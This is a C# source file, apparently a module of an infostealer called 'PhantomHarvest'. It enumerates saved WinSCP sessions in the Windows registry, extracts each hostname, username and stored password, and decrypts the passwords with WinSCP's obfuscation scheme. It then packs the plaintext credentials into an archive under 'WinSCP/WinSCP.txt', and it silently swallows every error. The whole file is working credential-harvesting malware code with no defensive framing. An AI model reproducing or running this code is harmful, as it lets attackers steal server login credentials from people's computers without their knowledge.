using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.FTPs
{
	internal class WinSCP
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string info = WinSCP.GetInfo();
				if (!string.IsNullOrEmpty(info))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(info)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, WinSCP.FTPName + "/WinSCP.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		private static WinSCP.Flags DecryptNextCharacterWinSCP(string passwd)
		{
			string text = "0123456789ABCDEF";
			int num = text.IndexOf(passwd[0]) * 16;
			int num2 = text.IndexOf(passwd[1]);
			int num3 = num + num2;
			WinSCP.Flags result;
			result.flag = (char)((~(num3 ^ WinSCP.PW_MAGIC) % 256 + 256) % 256);
			result.remainingPass = passwd.Substring(2);
			return result;
		}

		private static string DecryptWinSCPPassword(string Host, string userName, string passWord)
		{
			string text = string.Empty;
			string text2 = userName + Host;
			WinSCP.Flags flags = WinSCP.DecryptNextCharacterWinSCP(passWord);
			int flag = (int)flags.flag;
			char flag2;
			if (flag == (int)WinSCP.PW_FLAG)
			{
				flags = WinSCP.DecryptNextCharacterWinSCP(flags.remainingPass);
				flags = WinSCP.DecryptNextCharacterWinSCP(flags.remainingPass);
				flag2 = flags.flag;
			}
			else
			{
				flag2 = flags.flag;
			}
			flags = WinSCP.DecryptNextCharacterWinSCP(flags.remainingPass);
			flags.remainingPass = flags.remainingPass.Substring((int)(flags.flag * '\u0002'));
			for (int i = 0; i < (int)flag2; i++)
			{
				flags = WinSCP.DecryptNextCharacterWinSCP(flags.remainingPass);
				text += flags.flag.ToString();
			}
			if (flag == (int)WinSCP.PW_FLAG)
			{
				text = ((text.Substring(0, text2.Length) == text2) ? text.Substring(text2.Length) : "");
			}
			return text;
		}

		public static string GetInfo()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string name = "Software\\Martin Prikryl\\WinSCP 2\\Sessions";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			if (registryKey == null)
			{
				return "";
			}
			foreach (string name2 in registryKey.GetSubKeyNames())
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name2))
				{
					if (registryKey2 != null)
					{
						string text = (registryKey2.GetValue("HostName") != null) ? registryKey2.GetValue("HostName").ToString() : "";
						if (!string.IsNullOrEmpty(text))
						{
							try
							{
								string text2 = registryKey2.GetValue("UserName").ToString();
								string text3 = registryKey2.GetValue("Password").ToString();
								stringBuilder.AppendLine("hostname: " + text);
								stringBuilder.AppendLine("username: " + text2);
								stringBuilder.AppendLine("rawpass: " + text3);
								stringBuilder.AppendLine("password: " + WinSCP.DecryptWinSCPPassword(text, text2, text3));
							}
							catch
							{
							}
						}
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string FTPName = "WinSCP";

		private static readonly int PW_MAGIC = 163;

		private static readonly char PW_FLAG = 'ÿ';

		private struct Flags
		{
			public char flag;

			public string remainingPass;
		}
	}
}
